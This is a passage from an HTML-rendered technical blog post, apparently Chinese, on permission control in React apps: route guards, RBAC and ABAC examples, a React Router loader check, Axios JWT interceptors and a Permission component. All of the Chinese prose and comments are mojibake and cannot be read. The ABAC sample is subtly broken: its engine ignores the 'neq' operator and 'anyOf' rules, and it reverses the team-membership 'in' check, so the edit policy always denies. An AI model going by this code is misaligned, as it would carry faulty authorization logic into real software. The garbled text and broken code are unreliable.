class="hljs-string">&#x27;/&#x27;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">HomePage</span> /&gt;</span></span>,<br>    <span class="hljs-attr">public</span>: <span class="hljs-literal">true</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/dashboard&#x27;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DashboardLayout</span> /&gt;</span></span>,<br>    <span class="hljs-attr">roles</span>: [<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>],<br>    <span class="hljs-attr">children</span>: [<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;analytics&#x27;</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Analytics</span> /&gt;</span></span> &#125;,<br>      &#123; <br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <br>        <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminPanel</span> /&gt;</span></span>,<br>        <span class="hljs-attr">roles</span>: [<span class="hljs-string">&#x27;admin&#x27;</span>] <span class="hljs-comment">// å­è·¯ç”±å¯ä»¥è¦†ç›–çˆ¶è·¯ç”±æƒé™</span><br>      &#125;<br>    ]<br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/system-settings&#x27;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SystemSettings</span> /&gt;</span></span>,<br>    <span class="hljs-attr">roles</span>: [<span class="hljs-string">&#x27;superadmin&#x27;</span>]<br>  &#125;<br>];<br><br><span class="hljs-comment">// è·¯ç”±æ¸²æŸ“å™¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">renderRoutes</span> = (<span class="hljs-params">routes</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> routes.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">route</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;route.path&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">path</span>=<span class="hljs-string">&#123;route.path&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">route.public</span> ? (</span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">route.element</span></span></span><br><span class="hljs-tag"><span class="language-xml">        ) <span class="hljs-attr">:</span> (</span></span><br><span class="hljs-tag"><span class="language-xml">          &lt;<span class="hljs-attr">RouteGuard</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&#123;route.roles&#125;</span>&gt;</span></span><br><span class="language-xml">            &#123;route.element&#125;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">RouteGuard</span>&gt;</span></span><br><span class="language-xml">        )</span><br><span class="language-xml">      &#125;</span><br><span class="language-xml">    &gt;</span><br><span class="language-xml">      &#123;route.children &amp;&amp; renderRoutes(route.children)&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br>  ));<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>RBACï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æƒé™æœåŠ¡</span><br><span class="hljs-keyword">const</span> permissionService = &#123;<br>  <span class="hljs-comment">// è§’è‰²æƒé™æ˜ å°„</span><br>  <span class="hljs-attr">roles</span>: &#123;<br>    <span class="hljs-attr">guest</span>: [<span class="hljs-string">&#x27;view_public&#x27;</span>],<br>    <span class="hljs-attr">user</span>: [<span class="hljs-string">&#x27;view_dashboard&#x27;</span>, <span class="hljs-string">&#x27;edit_profile&#x27;</span>],<br>    <span class="hljs-attr">admin</span>: [<span class="hljs-string">&#x27;manage_users&#x27;</span>, <span class="hljs-string">&#x27;view_reports&#x27;</span>, <span class="hljs-string">&#x27;edit_settings&#x27;</span>],<br>    <span class="hljs-attr">superadmin</span>: [<span class="hljs-string">&#x27;*&#x27;</span>] <span class="hljs-comment">// æ‰€æœ‰æƒé™</span><br>  &#125;,<br>  <br>  <span class="hljs-comment">// æ£€æŸ¥æƒé™</span><br>  <span class="hljs-title function_">hasPermission</span>(<span class="hljs-params">user, requiredPermission</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!user || !user.<span class="hljs-property">role</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <br>    <span class="hljs-keyword">const</span> userPermissions = <span class="hljs-variable language_">this</span>.<span class="hljs-property">roles</span>[user.<span class="hljs-property">role</span>] || [];<br>    <br>    <span class="hljs-keyword">return</span> userPermissions.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;*&#x27;</span>) || <br>           userPermissions.<span class="hljs-title function_">includes</span>(requiredPermission);<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// æƒé™æ£€æŸ¥é’©å­</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">usePermission</span> = (<span class="hljs-params">requiredPermission</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <br>  <span class="hljs-keyword">return</span> permissionService.<span class="hljs-title function_">hasPermission</span>(user, requiredPermission);<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AnalyticsPage</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> canViewReports = <span class="hljs-title function_">usePermission</span>(<span class="hljs-string">&#x27;view_reports&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;canViewReports ? (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">AnalyticsChart</span> /&gt;</span></span><br><span class="language-xml">      ) : (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;permission-warning&quot;</span>&gt;</span></span><br><span class="language-xml">          æ‚¨æ²¡æœ‰æŸ¥çœ‹æŠ¥è¡¨çš„æƒé™</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ABACï¼ˆåŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ABAC ç­–ç•¥å¼•æ“</span><br><span class="hljs-keyword">const</span> abacEngine = &#123;<br>  <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">policy, context</span>) &#123;<br>    <span class="hljs-comment">// ç®€åŒ–ç‰ˆç­–ç•¥è¯„ä¼°</span><br>    <span class="hljs-keyword">return</span> policy.<span class="hljs-property">rules</span>.<span class="hljs-title function_">every</span>(<span class="hljs-function"><span class="hljs-params">rule</span> =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> value = context[rule.<span class="hljs-property">attribute</span>];<br>      <span class="hljs-keyword">switch</span> (rule.<span class="hljs-property">operator</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;eq&#x27;</span>: <span class="hljs-keyword">return</span> value == rule.<span class="hljs-property">value</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;gt&#x27;</span>: <span class="hljs-keyword">return</span> value &gt; rule.<span class="hljs-property">value</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;in&#x27;</span>: <span class="hljs-keyword">return</span> rule.<span class="hljs-property">value</span>.<span class="hljs-title function_">includes</span>(value);<br>        <span class="hljs-attr">default</span>: <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<br>    &#125;);<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// é¡¹ç›®è®¿é—®æƒé™æ£€æŸ¥</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">useProjectAccess</span> = (<span class="hljs-params">projectId</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <span class="hljs-keyword">const</span> [project] = <span class="hljs-title function_">useFetchProject</span>(projectId);<br>  <br>  <span class="hljs-keyword">const</span> canEdit = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!user || !project) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <br>    <span class="hljs-keyword">const</span> context = &#123;<br>      <span class="hljs-attr">userId</span>: user.<span class="hljs-property">id</span>,<br>      <span class="hljs-attr">userRole</span>: user.<span class="hljs-property">role</span>,<br>      <span class="hljs-attr">projectOwner</span>: project.<span class="hljs-property">ownerId</span>,<br>      <span class="hljs-attr">projectStatus</span>: project.<span class="hljs-property">status</span>,<br>      <span class="hljs-attr">teamMembers</span>: project.<span class="hljs-property">teamMembers</span><br>    &#125;;<br>    <br>    <span class="hljs-keyword">const</span> editPolicy = &#123;<br>      <span class="hljs-attr">rules</span>: [<br>        &#123; <span class="hljs-attr">attribute</span>: <span class="hljs-string">&#x27;userRole&#x27;</span>, <span class="hljs-attr">operator</span>: <span class="hljs-string">&#x27;in&#x27;</span>, <span class="hljs-attr">value</span>: [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;pm&#x27;</span>] &#125;,<br>        &#123; <br>          <span class="hljs-attr">attribute</span>: <span class="hljs-string">&#x27;projectStatus&#x27;</span>, <br>          <span class="hljs-attr">operator</span>: <span class="hljs-string">&#x27;neq&#x27;</span>, <br>          <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;archived&#x27;</span> <br>        &#125;,<br>        &#123;<br>          <span class="hljs-attr">anyOf</span>: [<br>            &#123; <span class="hljs-attr">attribute</span>: <span class="hljs-string">&#x27;projectOwner&#x27;</span>, <span class="hljs-attr">operator</span>: <span class="hljs-string">&#x27;eq&#x27;</span>, <span class="hljs-attr">value</span>: user.<span class="hljs-property">id</span> &#125;,<br>            &#123; <span class="hljs-attr">attribute</span>: <span class="hljs-string">&#x27;teamMembers&#x27;</span>, <span class="hljs-attr">operator</span>: <span class="hljs-string">&#x27;in&#x27;</span>, <span class="hljs-attr">value</span>: user.<span class="hljs-property">id</span> &#125;<br>          ]<br>        &#125;<br>      ]<br>    &#125;;<br>    <br>    <span class="hljs-keyword">return</span> abacEngine.<span class="hljs-title function_">evaluate</span>(editPolicy, context);<br>  &#125;, [user, project]);<br>  <br>  <span class="hljs-keyword">return</span> &#123; canEdit &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ä¼ä¸šçº§æœ€ä½³å®è·µ-3"><a href="#ä¼ä¸šçº§æœ€ä½³å®è·µ-3" class="headerlink" title="ä¼ä¸šçº§æœ€ä½³å®è·µ"></a>ä¼ä¸šçº§æœ€ä½³å®è·µ</h3><p><strong>è·¯ç”±å…ƒæ•°æ®æ–¹æ¡ˆ (React Router 6.4+)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨loaderå®ç°æƒé™æ§åˆ¶</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createBrowserRouter</span>([<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/admin&quot;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminLayout</span> /&gt;</span></span>,<br>    <span class="hljs-attr">loader</span>: <span class="hljs-title function_">async</span> () =&gt; &#123;<br>      <span class="hljs-comment">// æƒé™æ£€æŸ¥</span><br>      <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-keyword">await</span> authService.<span class="hljs-title function_">getCurrentUser</span>();<br>      <br>      <span class="hljs-keyword">if</span> (!user) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/login&quot;</span>);<br>      &#125;<br>      <br>      <span class="hljs-keyword">if</span> (user.<span class="hljs-property">role</span> !== <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&quot;Forbidden&quot;</span>, &#123; <span class="hljs-attr">status</span>: <span class="hljs-number">403</span> &#125;);<br>      &#125;<br>      <br>      <span class="hljs-keyword">return</span> &#123; user &#125;;<br>    &#125;,<br>    <span class="hljs-attr">errorElement</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminErrorBoundary</span> /&gt;</span></span>,<br>    <span class="hljs-attr">children</span>: [<br>      &#123; <span class="hljs-attr">index</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminDashboard</span> /&gt;</span></span> &#125;,<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;users&quot;</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserManagement</span> /&gt;</span></span> &#125;<br>    ]<br>  &#125;<br>]);<br></code></pre></td></tr></table></figure><p><strong>JWT è®¤è¯é›†æˆæ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Axios è¯·æ±‚æ‹¦æˆªå™¨</span><br>api.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;access_token&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (token) &#123;<br>    config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;token&#125;</span>`</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> config;<br>&#125;);<br><br><span class="hljs-comment">// Axios å“åº”æ‹¦æˆªå™¨ (å¤„ç†tokenåˆ·æ–°)</span><br>api.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<br>  <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response,<br>  <span class="hljs-keyword">async</span> error =&gt; &#123;<br>    <span class="hljs-keyword">const</span> originalRequest = error.<span class="hljs-property">config</span>;<br>    <br>    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">response</span>.<span class="hljs-property">status</span> === <span class="hljs-number">401</span> &amp;&amp; !originalRequest.<span class="hljs-property">_retry</span>) &#123;<br>      originalRequest.<span class="hljs-property">_retry</span> = <span class="hljs-literal">true</span>;<br>      <br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// åˆ·æ–°token</span><br>        <span class="hljs-keyword">const</span> &#123; data &#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">refreshToken</span>();<br>        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;access_token&#x27;</span>, data.<span class="hljs-property">access_token</span>);<br>        <br>        <span class="hljs-comment">// é‡è¯•åŸå§‹è¯·æ±‚</span><br>        originalRequest.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;data.access_token&#125;</span>`</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">api</span>(originalRequest);<br>      &#125; <span class="hljs-keyword">catch</span> (refreshError) &#123;<br>        <span class="hljs-comment">// åˆ·æ–°å¤±è´¥ï¼Œè·³è½¬ç™»å½•</span><br>        store.<span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">logout</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(refreshError);<br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);<br>  &#125;<br>);<br></code></pre></td></tr></table></figure><p><strong>æƒé™æŒ‡ä»¤å¼ç»„ä»¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æƒé™æ§åˆ¶ç»„ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">Permission</span> = (<span class="hljs-params">&#123; </span><br><span class="hljs-params">  children, </span><br><span class="hljs-params">  requiredPermission,</span><br><span class="hljs-params">  fallback = <span class="hljs-literal">null</span> </span><br><span class="hljs-params">&#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">usePermission</span>(requiredPermission);<br>  <br>  <span class="hljs-keyword">if</span> (!hasPermission) &#123;<br>    <span class="hljs-keyword">return</span> fallback;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> children;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserManagementPage</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>ç”¨æˆ·ç®¡ç†<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Permission</span> <span class="hljs-attr">requiredPermission</span>=<span class="hljs-string">&quot;create_user&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>åˆ›å»ºæ–°ç”¨æˆ·<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Permission</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Permission</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">requiredPermission</span>=<span class="hljs-string">&quot;delete_user&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-muted&quot;</span>&gt;</span>æ‚¨æ— æƒåˆ é™¤ç”¨æˆ·<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&#125;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">UserTable</span> <span class="hljs-attr">withActions</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Permission</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é¢è¯•é«˜é¢‘é—®é¢˜è§£å†³æ–¹æ¡ˆ"><a href="#é¢è¯•é«˜é¢‘é—®é¢˜è§£å†³æ–¹æ¡ˆ" class="headerlink" title="é¢è¯•é«˜é¢‘é—®é¢˜è§£å†³æ–¹æ¡ˆ"></a>é¢è¯•é«˜é¢‘é—®é¢˜è§£å†³æ–¹æ¡ˆ</h3><p><strong>Qï¼šè·¯ç”±åˆ‡æ¢æ—¶çš„æƒé™éªŒè¯</strong></p><p>é—®é¢˜ï¼šç”¨æˆ·æƒé™å˜æ›´åï¼Œå·²æ‰“å¼€é¡µé¢çš„æƒé™æœªæ›´æ–°</p><p>è§£å†³æ–¹æ¡ˆï¼šäº‹ä»¶æ€»çº¿é€šçŸ¥ + å…¨å±€çŠ¶æ€ç›‘å¬</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æƒé™å˜æ›´äº‹ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AuthEvents</span> = &#123;<br>  <span class="hljs-attr">PERMISSION_CHANGED</span>: <span class="hljs-string">&#x27;permission_changed&#x27;</span><br>&#125;;<br><br><span class="hljs-comment">// åœ¨æƒé™æœåŠ¡ä¸­</span><br>authService.<span class="hljs-property">onPermissionsChanged</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  eventBus.<span class="hljs-title function_">emit</span>(<span class="hljs-title class_">AuthEvents</span>.<span class="hljs-property">PERMISSION_CHANGED</span>);<br>&#125;;<br><br><span class="hljs-comment">// åœ¨è·¯ç”±å®ˆå«ç»„ä»¶ä¸­</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">RouteGuard</span> = (<span class="hljs-params">&#123; children, roles &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [permissionsValid, setPermissionsValid] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-title function_">setPermissionsValid</span>(<span class="hljs-title function_">checkPermissions</span>(roles));<br>    &#125;;<br>    <br>    eventBus.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">AuthEvents</span>.<span class="hljs-property">PERMISSION_CHANGED</span>, handler);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> eventBus.<span class="hljs-title function_">off</span>(handler);<br>  &#125;, [roles]);<br>  <br>  <span class="hljs-keyword">if</span> (!permissionsValid) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/unauthorized&quot;</span> <span class="hljs-attr">replace</span> /&gt;</span></span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> children;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šæŒ‰é’®çº§æƒé™çš„é˜²æŠ–æ§åˆ¶</strong></p><p>é—®é¢˜ï¼šé¢‘ç¹ç‚¹å‡»æƒé™æŒ‰é’®å¯¼è‡´å¤šæ¬¡æƒé™æ£€æŸ¥è¯·æ±‚</p><p>è§£å†³æ–¹æ¡ˆï¼šæƒé™ç¼“å­˜ + é˜²æŠ–æœºåˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 